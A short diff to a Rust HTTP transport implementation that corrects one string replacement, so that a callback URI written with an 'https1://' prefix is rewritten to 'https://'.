@@ -535,7 +535,7 @@ impl Transport for HTTP {
         // Extract URI and EXTRA from config using helper functions
         let c = crate::transport::extract_uri_from_config(&config)?;
         let callback = c
-            .replace("http1s://", "https://")
+            .replace("https1://", "https://")
             .replace("http1://", "http://");
         let extra_map = crate::transport::extract_extra_from_config(&config);
 
